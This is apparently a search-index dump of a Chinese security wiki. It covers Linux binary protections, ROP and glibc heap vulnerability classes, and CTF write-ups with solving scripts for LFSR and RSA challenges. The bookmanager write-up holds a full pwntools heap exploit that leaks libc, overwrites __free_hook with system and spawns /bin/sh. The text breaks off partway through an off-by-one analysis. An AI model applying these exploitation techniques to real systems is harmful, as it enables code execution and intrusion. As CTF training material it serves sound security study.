"},{"id":11,"href":"/docs/%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF/ctf-wiki/7.1.stackoverflow/2.protection/","title":"2. Protection","section":"7.1.StackOverflow","content":" 参考：\n  https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/stack-intro-zh/\n  https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/stackoverflow-basic-zh/\n  https://introspelliam.github.io/2017/09/30/linux程序的常用保护机制/\n   保护手段 #  Canary #  简单地说：\n 函数在调用时，在返回地址与局部变量之间设置了一个用户不可知的 Canary； 在函数结束调用时，函数检查这个 Canary 是否被修改，否则抛出异常；  gcc 在编译时可以控制以下的几个参数控制栈的保护程度：\n# 禁用栈帧保护 $ gcc -fno-stack-protector a.c # 开启栈帧保护 $ gcc -fstack-protector a.c # 启用栈帧保护，为所有函数插入保护代码 $ gcc -fstack-protector-all a.c Fortify #  Fortify 是 gcc 的一个检测工具，它会在编译时检测危险的字符串操作函数，比如 memcpy、strcpy 等。\n它有弱强两种使用模式：\n  D_FORTIFY_SOURCE 设置为 1 进行较弱的检查：\n 程序编译时就会进行检查，但是不会改变程序的功能； 程序仅仅在编译时进行检查，运行时不会检查；  $ gcc -D_FORTIFY_SOURCE=1 t.c   D_FORTIFY_SOURCE 设置为 2 进行较强的检查：\n 程序编译时可能会改变程序执行的函数，可能会导致程序崩溃； 程序在运行时会进行检查，检查到缓冲区溢出会终止程序；  $ gcc -D_FORTIFY_SOURCE=2 t.c   NX (DEP) #  这一技术的基本原理是将数据所在的内存页标注为不可执行，程序试图在数据上执行代码时，CPU 会抛出异常。\ngcc 默认开启了 NX 选项，可以通过以下的方式控制 NX 保护：\n# 禁用 NX 保护 $ gcc -z execstack t.c # 开启 NX 保护 $ gcc -z noexecstack t.c PIE (ASLR) #  PIE: Position Independent Executable（位置独立可执行）。gcc 通过以下的方式控制是否开启 PIE：\n# PIE 默认开启 $ gcc --enable-default-pie t.c # 关闭 PIE $ gcc -no-pie t.c 但是在 Linux 平台下，即使文件开启了 PIE 保护，还需要系统开启 ASLR 才会打乱基址，否则程序仍然会加载在一个固定的基址上（只不过和不开启 PIE 不一样）。\n我们可以通过控制文件 /proc/sys/kernel/randomize_va_space 控制是否开启 ASLR：\n 0：表示关闭进程地址空间随机化。 1：表示将 mmap 的基址，stack 和 vdso 页面随机化。 2：表示在 1 的基础上增加堆区基址的随机化（下图中的 Random brk offset）。  Relro #  gcc、gnu linker、glic-dynamic-linker 一起配合实现了一种叫做 Relro 的技术（Read Only Relocation）。\n实现方式就是通过 linker 指定文件的的部分区域标记为只读区域。\n在 gcc 中指定以下的参数可以控制编译的方式：\n$ gcc -z norelro t.c\t# 关闭 $ gcc -z lazy t.c\t# 部分开启，可写 $gcc -z now t.c\t# 全部开启，只读 "},{"id":12,"href":"/docs/%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF/ctf-wiki/7.1.stackoverflow/3.rop/","title":"3. Rop","section":"7.1.StackOverflow","content":"ROP 技术 #  基本 ROP #  ret2text #  ret2text 即控制程序执行程序本身已有的的代码 (.text)。例子\nret2shellcode #  ret2shellcode，即控制程序执行 shellcode 代码。一般来说，shellcode 需要我们自己填充。例子\nret2syscall #  ret2syscall，即控制程序执行系统调用，获取 shell。例子\n此时就需要用到 ROP 链了，得到 ROP 链可以使用 ROPgadget 这个工具，见 TIPS\nret2libc #  ret2libc 即控制函数的执行 libc 中的函数，通常是返回至某个函数的 plt 处或者函数的具体位置 (即函数对应的 got 表项的内容)。\n一般情况下，我们会选择执行 system(\u0026quot;/bin/sh\u0026quot;)，故而此时我们需要知道 system 函数的地址。\n中级 ROP #  ret2csu #  在 64 位程序中，函数的前 6 个参数是通过寄存器传递的，但是大多数时候，我们很难找到每一个寄存器对应的 gadgets。 这时候，我们可以利用 x64 下的 __libc_csu_init 中的 gadgets。\n这个函数是用来对 libc 进行初始化操作的，而一般的程序都会调用 libc 函数，所以这个函数一定会存在。\nBROP #  黑盒测试的办法。见：http://www.scs.stanford.edu/brop/bittau-brop.pdf\n高级 ROP #  ret2dlresolve #  要想弄懂这个 ROP 利用技巧，需要首先理解 ELF 文件的基本结构以及动态链接的基本过程：ElfFormat\n在程序执行延迟绑定的函数时实际上会跳到 PLT 中保存的地址执行，这个地址上包含了三行函数。我们以 write@plt 举例：\n$ objdump --disassemble-all ret2dlresolve | grep -A 3 \u0026#34;write@plt\u0026#34; 00000490 \u0026lt;write@plt\u0026gt;: 490: ff a3 1c 00 00 00 jmp *0x1c(%ebx) 496: 68 20 00 00 00 push $0x20 49b: e9 a0 ff ff ff jmp 440 \u0026lt;.plt\u0026gt; ....  第一行是直接跳转到 GOT 表中，write 函数的真实地址。程序刚加载时，GOT 表中的地址都是指向 PLT 表的下一个位置，即上图中的 496； 第二行将 0x20 入栈，准备将其作为参数调用函数； 第三行调用 .plt 表、第 440 行的指令。这个位置的指令把 link_map=*(GOT+4)（即链接器的标识信息）作为参数推入栈中，然后调用 *(GOT+8)（保存的是_dl_runtime_resolve函数的地址）。  上面的操作实际调用的是 _dl_runtime_resolve(link_map, reloc_arg)，该函数会完成符号的解析，即将真实的 write 函数地址写入其 GOT 条目中，随后把控制权交给 write 函数。\n_dl_runtime_resolve 是在 glibc-2.23/sysdeps/i386/dl-trampoline.S 中用汇编实现的。0xf7fededb 处即调用 _dl_fixup，并且通过寄存器传参。\nSROP #  "},{"id":13,"href":"/docs/%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF/ctf-wiki/7.3.glibcheap/0.%E6%BC%8F%E6%B4%9E%E7%B1%BB%E5%9E%8B/","title":"0.漏洞类型","section":"7.3.GlibcHeap","content":"漏洞类型 #  Off By One 漏洞 #  漏洞原理 #  严格来说 off-by-one 漏洞是一种特殊的溢出漏洞，off-by-one 指程序向缓冲区中写入时，写入的字节数超过了这个缓冲区本身所申请的字节数并且只越界了一个字节。\n一般来说，单字节溢出被认为是难以利用的，但是因为 Linux 的堆管理机制 ptmalloc 验证的松散性，基于 Linux 堆的 off-by-one 漏洞利用起来并不复杂，并且威力强大。\n利用思路 #  根据溢出的字节类型，可以分为以下两种情况：\n 溢出字节为任意可以控制的字节。通过修改大小造成块之间出现重叠，从而泄露或覆盖其他块的数据。 溢出字节为 NULL 字节。在 size=0x100 时，溢出 NULL 字节会使 prev_in_use 位被清零：  这时可以选择 unlink 方法进行处理（漏洞利用方式 unlink）； 另外 prev_size 域就会启用，伪造 prev_size 可以造成块之间的重叠（glibc2.28 已经修复）。    使用示例 #  Asis CTF 2016 b00ks\nUse After Free 漏洞 #  漏洞原理 #  Use After Free 即释放后重用，可以利用的漏洞主要分为以下两种情况：\n 内存块被释放后，其对应的指针没有被设置为 NULL ，在它下一次被使用之前，没有修改。 内存块被释放后，其对应的指针没有被设置为 NULL，但是在它下一次使用之前，有代码进行了修改。  此外，我们一般称被释放后没有被设置为 NULL 的内存指针为 dangling pointer。\n如果报错内容出现 segment fault (core dumped) 一般就是这个情况导致的。\n使用示例 #  Hitcon Traning lab10\nDouble Free 漏洞 #  "},{"id":14,"href":"/docs/%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF/ctf-wiki/7.3.glibcheap/1.unlink/","title":"1. Unlink","section":"7.3.GlibcHeap","content":"Unlink #  unlink 是什么？\n 它是 glibc 中通过宏实现的一个函数，在 GlibcHeap 中有源码介绍； unlink 的目的是将 bin 链表中的一个元素从链表中取出；  "},{"id":15,"href":"/docs/%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF/ctf-writeup/2019de1ctf/babylfsr/","title":"Babylfsr","section":"2019de1ctf","content":"baby lfsr #  在比赛的时候一直在想怎么用 berlekamp_massey 算法求解（用矩阵求解，写代码更快，512 比特没必要用 BM 算法），并且把判断条件抄成了 1124 \u0026hellip;.\n脚本 #  破解 LFSR：指定一个比特序列，返回一个转移矩阵（实现方式详见 https://github.com/shesl-meow/shesl-crypto）。\n最终的破解脚本：\n#!/usr/bin/env python2 # coding=utf-8 import hashlib from sage.all import * from itertools import product from sheslcrypto.LFSR import CrackLfsr if __name__==\u0026#34;__main__\u0026#34;: with open(\u0026#34;output\u0026#34;, \u0026#34;r\u0026#34;) as f: raw = [int(b) for b in f.read().strip()] for num in product([0, 1], repeat=8): CL = CrackLfsr(raw + list(num), period=256) try: T = CL.crack_by_matrix() except AssertionError: continue Tn = T ** 256 initial = Tn.solve_left(vector(raw[:256])) key = ZZ(list(initial)[::-1], base=2) flag = hashlib.sha256(key.hex().rstrip(\u0026#39;L\u0026#39;)).hexdigest() print flag if flag[:4] == \u0026#34;1224\u0026#34;: break "},{"id":16,"href":"/docs/%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF/ctf-writeup/2019de1ctf/babyrsa/","title":"Babyrsa","section":"2019de1ctf","content":"baby rsa #  这题涉及了大量的 RSA 相关的破解知识。\n题目 #  阅读题目之后实际上就是解数个方程，在没有 hint 的情况下，方程如下：\n  $$\\begin{cases} p^4 \\equiv C_{1} \\pmod{N_{1}} \\ p^4 \\equiv C_{2} \\pmod{N_{2}} \\ p^4 \\equiv C_{3} \\pmod{N_{3}} \\ p^4 \\equiv C_{4} \\pmod{N_{4}}\\end{cases}$$\n  $$\\begin{cases} (e_1)^{42} \u0026amp;\\equiv C_{e1} \\pmod{N_e} \\ (e_2 + T)^3 \u0026amp;\\equiv C_{e2} \\pmod{N_e}\\end{cases}$$\n  $$q_1 * x = N_q \\text{ where } q_1 \u0026lt; x$$\n  $$\\begin{cases} flag^{e_1} \\equiv C_{f1} \\pmod{p * q_1} \\ flag^{e_2} \\equiv C_{f2} \\pmod{p * q_2}\\end{cases}$$\n  上面所有方程的大写字母均为已知数字。\n脚本 #  最后的分析使用了三个攻击技巧（实现方式详见 https://github.com/shesl-meow/shesl-crypto）：\n  分解大小相近的素数积\n  小指数得到明文\n  指数与欧拉函数不互素求解。\n  关于其中的第三点。因为在最后一步需要解下面的方程（其中只有 flag 一个未知数）：\n $$flag^{e_1} \\equiv C_{f1} \\pmod{p * q_1}$$  因为上面的 e1 与 phi(p*q1) 不是互素的，不能用常规的方程求解。\n上面的方程显然可以被我们分解成两个独立的方程，然后我们单独研究后者（因为指数 e 与后者的欧拉函数，最小公倍数更小，我们更容易直接开方）：\n 设：$$phi = q_1 -1, g = gcd(phi, e_1)$$ 我们考虑 $$flag^{g}$$ 作为这个加密体系的明文，可以根据常规的 RSA 解出：  $$\\displaystyle e_g = \\frac{e_1}{g}, d_g \\equiv (e_g)^{-1} \\pmod{phi}$$ $$flag^g \\equiv (C_{f1})^{d_g} \\pmod{q_1}$$   因为这个时候的 g，已经非常小了可以直接按小指数得到明文  完整的脚本如下：\n#!/usr/bin/env python2 from sage.all import * from binascii import a2b_hex from sheslcrypto.RSA import CrackNearPQ, CrackSmallE, CrackEPhiNotRP from const import * if __name__ == \u0026#34;__main__\u0026#34;: p4 = crt([C1, C2, C3, C4], [N1, N2, N3, N4]) CRSE = CrackSmallE(p4, 4, N1 * N2 * N3 * N4) p = CRSE.crack() assert is_prime(p) print \u0026#34;p: %d\u0026#34; % p CRSE = CrackSmallE(Ce1, 42, Ne) e1 = CRSE.crack() print \u0026#34;e1: %d\u0026#34; % e1 CRSE = CrackSmallE(Ce2, 3, Ne) e2 = (CRSE.crack() - T) % Ne print \u0026#34;e2: %d\u0026#34; % e2 CNPQ = CrackNearPQ(Nq) q1,_ = CNPQ.crack() print \u0026#34;q1: %d\u0026#34; % q1 CEPM = CrackEPhiNotRP(Cf1, e1, p, q1) flag = CEPM.crack_by_q() print \u0026#34;flag: %s\u0026#34; % a2b_hex(flag.hex()) 附录 #  const.py\nN1 = 20129615352491765499340112943188317180548761597861300847305827141510465619670536844634558246439230371658836928103063432870245707180355907194284861510906071265352409579441048101084995923962148527097370705452070577098780246282820065573711015664291991372085157016901209114191068574208680397710042842835940428451949500607613634682684113208766694028789275748528254287705759528498986306494267817198340658241873024800336013946294891687591013414935237821291805123285905335762719823771647853378892868896078424572232934360940672962436849523915563328779942134504499568866135266628078485232098208237036724121481835035731201383423L C1 = 19131432661217908470262338421299691998526157790583544156741981238822158563988520225986915234570037383888112724408392918113942721994125505014727545946133307329781747600302829588248042922635714391033431930411180545085316438084317927348705241927570432757892985091396044950085462429575440060652967253845041398399648442340042970814415571904057667028157512971079384601724816308078631844480110201787343583073815186771790477712040051157180318804422120472007636722063989315320863580631330647116993819777750684150950416298085261478841177681677867236865666207391847046483954029213495373613490690687473081930148461830425717614569L N2 = 31221650155627849964466413749414700613823841060149524451234901677160009099014018926581094879840097248543411980533066831976617023676225625067854003317018794041723612556008471579060428898117790587991055681380408263382761841625714415879087478072771968160384909919958010983669368360788505288855946124159513118847747998656422521414980295212646675850690937883764000571667574381419144372824211798018586804674824564606122592483286575800685232128273820087791811663878057827386379787882962763290066072231248814920468264741654086011072638211075445447843691049847262485759393290853117072868406861840793895816215956869523289231421L C2 = 15341898433226638235160072029875733826956799982958107910250055958334922460202554924743144122170018355117452459472017133614642242411479849369061482860570279863692425621526056862808425135267608544855833358314071200687340442512856575278712986641573012456729402660597339609443771145347181268285050728925993518704899005416187250003304581230701444705157412790787027926810710998646191467130550713600765898234392350153965811595060656753711278308005193370936296124790772689433773414703645703910742193898471800081321469055211709339846392500706523670145259024267858368216902176489814789679472227343363035428541915118378163012031L N3 = 29944537515397953361520922774124192605524711306753835303703478890414163510777460559798334313021216389356251874917792007638299225821018849648520673813786772452822809546571129816310207232883239771324122884804993418958309460009406342872173189008449237959577469114158991202433476710581356243815713762802478454390273808377430685157110095496727966308001254107517967559384019734279861840997239176254236069001453544559786063915970071130087811123912044312219535513880663913831358790376650439083660611831156205113873793106880255882114422025746986403355066996567909581710647746463994280444700922867397754748628425967488232530303L C3 = 18715065071648040017967211297231106538139985087685358555650567057715550586464814763683688299037897182845007578571401359061213777645114414642903077003568155508465819628553747173244235936586812445440095450755154357646737087071605811984163416590278352605433362327949048243722556262979909488202442530307505819371594747936223835233586945423522256938701002370646382097846105014981763307729234675737702252155130837154876831885888669150418885088089324534892506199724486783446267336789872782137895552509353583305880144947714110009893134162185382309992604435664777436197587312317224862723813510974493087450281755452428746194446L N4 = 25703437855600135215185778453583925446912731661604054184163883272265503323016295700357253105301146726667897497435532579974951478354570415554221401778536104737296154316056314039449116386494323668483749833147800557403368489542273169489080222009368903993658498263905567516798684211462607069796613434661148186901892016282065916190920443378756167250809872483501712225782004396969996983057423942607174314132598421269169722518224478248836881076484639837343079324636997145199835034833367743079935361276149990997875905313642775214486046381368619638551892292787783137622261433528915269333426768947358552919740901860982679180791L C4 = 2282284561224858293138480447463319262474918847630148770112472703128549032592187797289965592615199709857879008271766433462032328498580340968871260189669707518557157836592424973257334362931639831072584824103123486522582531666152363874396482744561758133655406410364442174983227005501860927820871260711861008830120617056883514525798709601744088135999465598338635794275123149165498933580159945032363880613524921913023341209439657145962332213468573402863796920571812418200814817086234262280338221161622789516829363805084715652121739036183264026120868756523770196284142271849879003202190966150390061195469351716819539183797L Ce1 = 45722651786340123946960815003059322528810481841378247280642868553607692149509126962872583037142461398806689489141741494974836882341505234255325683219092163052843461632338442529011502378931140356111756932712822516814023166068902569458299933391973504078898958921809723346229893913662577294963528318424676803942288386430172430880307619748186863890050113934573820505570928109017842647598266634344447182347849367714564686341871007505886728393751147033556889217604647355628557502208364412269944908011305064122941446516990168924709684092200183860653173856272384 Ce2 = 13908468332333567158469136439932325992349696889129103935400760239319454409539725389747059213835238373047899198211128689374049729578146875309231962936554403287882999967840346216695208424582739777034261079550395918048421086843927009452479936045850799096750074359160775182238980989229190157551197830879877097703347301072427149474991803868325769967332356950863518504965486565464059770451458557744949735282131727956056279292800694203866167270268988437389945703117070604488999247750139568614939965885211276821987586882908159585863514561191905040244967655444219603287214405014887994238259270716355378069726760953320025828158 T = 864078778078609835167779565982540757684070450697854309005171742813414963447462554999012718960925081621571487444725528982424037419052194840720949809891134854871222612682162490991065015935449289960707882463387 Ne = 15911581555796798614711625288508309704791837516232122410440958830726078821069050404012820896260071751380436992710638364294658173571101596931605797509712839622479368850251206419748090059752427303611760004621378226431226983665746837779056271530181865648115862947527212787824629516204832313026456390047768174765687040950636530480549014401279054346098030395100387004111574278813749630986724706263655166289586230453975953773791945408589484679371854113457758157492241225180907090235116325034822993748409011554673180494306003272836905082473475046277554085737627846557240367696214081276345071055578169299060706794192776825039 Nq = 16278524034278364842964386062476113517067911891699789991355982121084973951738324063305190630865511554888330215827724887964565979607808294168282995825864982603759381323048907814961279012375346497781046417204954101076457350988751188332353062731641153547102721113593787978587135707313755661153376485647168543680503160420091693269984008764444291289486805840439906620313162344057956594836197521501755378387944609246120662335790110901623740990451586621846212047950084207251595169141015645449217847180683357626383565631317253913942886396494396189837432429078251573229378917400841832190737518763297323901586866664595327850603 Cf1 = 262739975753930281690942784321252339035906196846340713237510382364557685379543498765074448825799342194332681181129770046075018122033421983227887719610112028230603166527303021036386350781414447347150383783816869784006598225583375458609586450854602862569022571672049158809874763812834044257419199631217527367046624888837755311215081173386523806086783266198390289097231168172692326653657393522561741947951887577156666663584249108899327053951891486355179939770150550995812478327735917006194574412518819299303783243886962455399783601229227718787081785391010424030509937403600351414176138124705168002288620664809270046124 Cf2 = 7395591129228876649030819616685821899204832684995757724924450812977470787822266387122334722132760470911599176362617225218345404468270014548817267727669872896838106451520392806497466576907063295603746660003188440170919490157250829308173310715318925771643105064882620746171266499859049038016902162599261409050907140823352990750298239508355767238575709803167676810456559665476121149766947851911064706646506705397091626648713684511780456955453552020460909638016134124590438425738826828694773960514221910109473941451471431637903182205738738109429736425025621308300895473186381826756650667842656050416299166317372707709596 "},{"id":17,"href":"/docs/%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF/ctf-writeup/2019ogeek/bookmanager/","title":"Bookmanager","section":"2019OGeek","content":"写在前面 #  第一次比赛一个堆溢出题目快要做出来了，却因为环境配置问题（一直无法用给定版本的 libc.so 运行程序）。最后不得不再源码编译 glibc-2.23（坑太多了，系统被搞崩了一次），心态爆炸。\n指定版本的 libc 运行程序 #  总结一下到底应该如何使用一个给定的 glibc 库文件运行指定的可执行文件：\n  第一步则是需要拿到指定的 ld.so 文件（用于链接 libc.so 与可执行文件的程序），将目标文件的链接程序地址指向本地的 ld.so 文件。\n这一步网上有 python 脚本，但是使用 patchelf 这个命令更快。\n  第二步是设置 LD_PRELOAD 环境变量。\n  比如说，这个程序需要运行 libc-2.23.so，我们就需要执行以下的两条命令：\n$ patchelf --set-interpreter /usr/local/glibc-2.23/lib/ld-2.23.so bookmanager $ export LD_PRELOAD=/usr/local/glibc-2.23/lib/libc-2.23.so 如果我们已经将可执行文件中，链接程序的地址设置好了，我们也可以再 pwntools 中这么运行：\nfrom pwn import * p = process([\u0026#34;./bookmanager\u0026#34;], env={\u0026#34;LD_PRELOAD\u0026#34;: \u0026#34;/usr/local/glibc-2.23/lib/libc-2.23.so\u0026#34;}) 编译指定版本的 libc #  但是上面我文件中的 ld.so 文件，题目是没有给的，于是我们就需要通过源码编译的方式得到这个文件。\n 网上应该会有直接的资源下载，但是我太菜了，没有找到，只找到了源码的国内镜像  如果没有遇到任何问题，下面几条命令应该是一个完整的编译流程：\n$ wget http://mirrors.nju.edu.cn/gnu/libc/glibc-2.23.tar.bz2 $ tar -xf glibc-2.23.tar.bz2 $ mkdir ./glibc-2.23/glibc-build \u0026amp;\u0026amp; cd ./glibc-2.23/glibc-build $ ../configure --prefix=/usr/local/glibc-2.23 --disable-werror $ make \u0026amp;\u0026amp; make install 但是，使用高版本的 gcc、g++ 交叉编译低版本的 glibc 会出现很多 bug：\n 源码层面的出现很多 bug 在网上找到了一个解决方案； cc1 会将 warning 当作 error，需要在运行 configure 命令时加入 --disable-werror。  book manager #  程序流程，漏洞发现什么的都不说了，这个题很简单，直接上 exp.py：\n#!/usr/bin/env python3 from pwn import * class Challenge: def __init__(self, local): self.local = local if local: self.p = process([\u0026#34;./bookmanager\u0026#34;], env={\u0026#34;LD_PRELOAD\u0026#34;: \u0026#34;/usr/local/glibc-2.23/lib/libc-2.23.so\u0026#34;}) else: self.p = remote(\u0026#34;47.112.115.30\u0026#34;, 13337) self.libc = ELF(\u0026#34;/usr/local/glibc-2.23/lib/libc-2.23.so\u0026#34;) self.section_ptr, self.book, self.libc_base = {}, {}, 0 def gdb(self, script): assert self.local context.terminal = [\u0026#39;tmux\u0026#39;, \u0026#39;splitw\u0026#39;, \u0026#39;-h\u0026#39;] gdb.attach(proc.pidof(self.p)[0], gdbscript=script) def set_bookname(self, book_name): self.p.sendlineafter(\u0026#34;Name of the book you want to create: \u0026#34;, book_name) self.p.recvuntil(\u0026#34;Your choice:\u0026#34;) def add_chapter(self, chapter_name): self.p.sendline(\u0026#34;1\u0026#34;) self.p.sendlineafter(\u0026#34;Chapter name:\u0026#34;, chapter_name) self.p.recvuntil(\u0026#34;Your choice:\u0026#34;) def add_section(self, chapter_name, section_name): self.p.sendline(\u0026#34;2\u0026#34;) self.p.sendlineafter(\u0026#34;Which chapter do you want to add into:\u0026#34;, chapter_name) self.section_ptr[section_name] = int(self.p.recvline().lstrip(\u0026#34;0x\u0026#34;), 16) self.p.sendlineafter(\u0026#34;Section name:\u0026#34;, section_name) self.p.recvuntil(\u0026#34;Your choice:\u0026#34;) def add_text(self, section_name, text_length, text): assert text_length \u0026lt;= 256 self.p.sendline(\u0026#34;3\u0026#34;) self.p.sendlineafter(\u0026#34;Which section do you want to add into:\u0026#34;, section_name) self.p.sendlineafter(\u0026#34;How many chapters you want to write:\u0026#34;, str(text_length)) self.p.sendlineafter(\u0026#34;Text:\u0026#34;, text) self.p.recvuntil(\u0026#34;Your choice:\u0026#34;) def remove_chapter(self, chapter_name): self.p.sendline(\u0026#34;4\u0026#34;) self.p.sendlineafter(\u0026#34;Chapter name:\u0026#34;, chapter_name) self.p.recvuntil(\u0026#34;Your choice:\u0026#34;) def remove_section(self, section_name): self.p.sendline(\u0026#34;5\u0026#34;) self.p.sendlineafter(\u0026#34;Section name:\u0026#34;, section_name) self.p.recvuntil(\u0026#34;Your choice:\u0026#34;) def remove_text(self, section_name): self.p.sendline(\u0026#34;6\u0026#34;) self.p.sendlineafter(\u0026#34;Section name:\u0026#34;, section_name) self.p.recvuntil(\u0026#34;Your choice:\u0026#34;) def book_preview(self): self.p.sendline(\u0026#34;7\u0026#34;) recved = self.p.recvuntil(\u0026#34;\\n==========================\u0026#34;). \\ rstrip(\u0026#34;\\n==========================\u0026#34;).lstrip(\u0026#34;\\nBook:\u0026#34;) book_name, chapters = recved.split(\u0026#34;\\nChapter:\u0026#34;)[0], recved.split(\u0026#34;\\nChapter:\u0026#34;)[1:] self.book = {book_name: {}} for cind, chapter in enumerate(chapters): chapter_name, sections = chapter.split(\u0026#34;\\nSection:\u0026#34;)[0], chapter.split(\u0026#34;\\nSection:\u0026#34;)[1:] self.book[book_name][chapter_name] = {} for sind, section in enumerate(sections): section_name, text = section.split(\u0026#34;\\nText:\u0026#34;)[0], section.split(\u0026#34;\\nText:\u0026#34;)[1] self.book[book_name][chapter_name][section_name] = text self.p.recvuntil(\u0026#34;Your choice:\u0026#34;) def update(self, choice, old, new): assert choice in [\u0026#34;Chapter\u0026#34;, \u0026#34;Section\u0026#34;, \u0026#34;Text\u0026#34;] self.p.sendline(\u0026#34;8\u0026#34;) self.p.sendlineafter(\u0026#34;What to update?(Chapter/Section/Text):\u0026#34;, choice) self.p.sendlineafter(\u0026#34;:\u0026#34;, old) self.p.sendlineafter(\u0026#34;:\u0026#34;, new) assert self.p.recvuntil(\u0026#34;Your choice:\u0026#34;).strip().startswith(\u0026#34;Updated\u0026#34;) def pwn(self): # todo: initialization self.set_bookname(\u0026#34;PWN_BOOK\u0026#34;) self.add_chapter(\u0026#34;chapter_one\u0026#34;) self.add_section(\u0026#34;chapter_one\u0026#34;, \u0026#34;section_one\u0026#34;) self.add_text(\u0026#34;section_one\u0026#34;, 0x100 - 0x10 - 0x30, \u0026#34;text_one\u0026#34;) self.add_section(\u0026#34;chapter_one\u0026#34;, \u0026#34;section_two\u0026#34;) # todo: leak heap to get arbitrarily write\u0026amp;read self.update(\u0026#34;Text\u0026#34;, \u0026#34;section_one\u0026#34;, flat([ \u0026#34;A\u0026#34; * 0xc8, 0x41, \u0026#34;section_two\u0026#34;.ljust(0x28, \u0026#34;\\x00\u0026#34;), 0x20 ], word_size=64)) def write_to(address, content): payload = flat([ \u0026#34;A\u0026#34; * 0xc8, 0x41, \u0026#34;section_two\u0026#34;.ljust(0x20, \u0026#34;\\x00\u0026#34;), address ], word_size=64) assert len(payload) \u0026lt; 0xff and len(content) \u0026lt; 0xff self.update(\u0026#34;Text\u0026#34;, \u0026#34;section_one\u0026#34;, payload) self.update(\u0026#34;Text\u0026#34;, \u0026#34;section_two\u0026#34;, content) def read_from(address): payload = flat([ \u0026#34;A\u0026#34; * 0xc8, 0x41, \u0026#34;section_two\u0026#34;.ljust(0x20, \u0026#34;\\x00\u0026#34;), address ], word_size=64) assert len(payload) \u0026lt; 0xff self.update(\u0026#34;Text\u0026#34;, \u0026#34;section_one\u0026#34;, payload) self.book_preview() text = self.book[\u0026#34;PWN_BOOK\u0026#34;][\u0026#34;chapter_one\u0026#34;][\u0026#34;section_two\u0026#34;] return u64(text.ljust(8, \u0026#34;\\x00\u0026#34;)[:8]) # todo: leak libc address from unsorted bin self.add_section(\u0026#34;chapter_one\u0026#34;, \u0026#34;section_three\u0026#34;) self.add_text(\u0026#34;section_three\u0026#34;, 0x100, \u0026#34;BIGTEXT\u0026#34;) self.add_chapter(\u0026#34;chapter_two\u0026#34;) # prevent heap-top self.remove_text(\u0026#34;section_three\u0026#34;) unsorted_bin_addr = read_from(self.section_ptr[\u0026#34;section_three\u0026#34;] + 0x30 + 0x10) self.libc_base = unsorted_bin_addr - 0x19eb78 print \u0026#34;leak libc_base: %x\u0026#34; % self.libc_base # todo: overwrite __free_hook \u0026amp; execute system(\u0026#34;/bin/sh\u0026#34;) free_hook_addr = self.libc.symbols[\u0026#34;__free_hook\u0026#34;] + self.libc_base system_addr = self.libc.symbols[\u0026#34;system\u0026#34;] + self.libc_base write_to(free_hook_addr, p64(system_addr)) self.add_chapter(\u0026#34;/bin/sh\u0026#34;) self.remove_chapter(\u0026#34;/bin/sh\u0026#34;) self.p.interactive() if __name__ == \u0026#34;__main__\u0026#34;: c = Challenge(True) c.pwn() "},{"id":18,"href":"/docs/%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF/ctf-writeup/ctf-wiki/offbyone/","title":"Offbyone","section":"ctf-wiki","content":" 题目：Asis CTF 2016 b00ks\n Off By One #  文件信息 #  首先检查保护等级：\n$ checksec ./b00ks [*] \u0026#39;/mnt/d/program/ctf/ctf-wiki/offbyone/b00ks\u0026#39; Arch: amd64-64-little RELRO: Full RELRO Stack: No canary found NX: NX enabled PIE: PIE enabled 程序没有开启栈保护。查看各个段的权限：\ngdb-peda$ vmmap Warning: not running Start End Perm Name 0x00000808 0x0000135d rx-p /mnt/d/program/ctf/ctf-wiki/offbyone/b00ks 0x00000238 0x00001914 r--p /mnt/d/program/ctf/ctf-wiki/offbyone/b00ks 0x00201d58 0x00202100 rw-p /mnt/d/program/ctf/ctf-wiki/offbyone/b00ks 各个段的地址则可以通过以下的方式查看：\n$ readelf --section-headers ./b00ks There are 27 section headers, starting at offset 0x2160: ...... 程序逻辑 #  main #  首先看 main 函数，将其中的调用的函数重命名之后函数的名字很明显了：\n__int64 __fastcall main(__int64 a1, char **a2, char **a3) { __int64 savedregs; // [rsp+20h] [rbp+0h]  setvbuf(stdout, 0LL, 2, 0LL); setvbuf(stdin, 0LL, 1, 0LL); print_welcome(); read_author_name(); while ( (unsigned int)menu() != 6 ) { switch ( (unsigned int)\u0026amp;savedregs ) { case 1u: create(); break; case 2u: delete(); break; case 3u: edit(); break; case 4u: detail(); break; case 5u: read_author_name(); break; default: puts(\u0026#34;Wrong option\u0026#34;); break; } } puts(\u0026#34;Thanks to use our library software\u0026#34;); return 0LL; } create #  通过阅读函数的伪代码，该函数大致实现的是下面的程序流程图：\n+---------+ +-------------+ +---------+ +----------------+\r|read size-------\u0026gt;|read bookname--------\u0026gt;|read size-------\u0026gt;|read description|\r+---------+ +-------------+ +---------+ +----------------+\r最后数据存入 GLOBAL_LIBRARY 全局变量中，其结构如下：\n .bss heap\rGLOBAL_LIBRARY +-------+ 0 |8 bytes| +---------------+ --------- |bookname string|\u0026lt;------------+\r1 |8 bytes| +---------------+ |\r--------- +------------------+ |\r2 |8 bytes| |description string|\u0026lt;----+ |\r--------- +------------------+ | |\r...| | | |\r--------- +----------+ | |\r18 |8 bytes|--------\u0026gt;0 |seq number| | |\r--------- ------------ | |\r19 |8 bytes| 1 |bookname_p|-------------|----+\r+-------+ ------------ | 2 |descript_p|-------------+ ------------\r3 |descript_l|(prev-4-bytes)\r------------ delete #  在这个函数中，先读取一个 id，然后用了一个 for 循环找到需要释放的位置，找到 ID 所在的位置之后，执行后面的释放内存的函数。并没有发现什么问题。\nedit #  该函数通过同样的方式找到了 for 循环需要释放的位置之后，调用了 read_str 函数，以之前 create 存储在内存中的结构作为传参，通过同样的方式设置了 description 的内存。并没有发现什么问题。\ndetail #  遍历 GLOBAL_LIBRARY 中的所有内容。\n将 id 指向的数字打印出来，将 bookname、bookdescription 与 authorname 指向的字符串打印出来。\nread_str #  在 read_auther_name()、create()、edit 这些函数中，都调用了一个自己实现的读取字符串的函数 read_str()。它传入的第一个参数是一个字符型指针，第二个参数都是 指针分配的内存大小 - 1。\n它的伪代码如下：\nsigned __int64 __fastcall read_str(_BYTE *ptr, int len_1) { int i; // 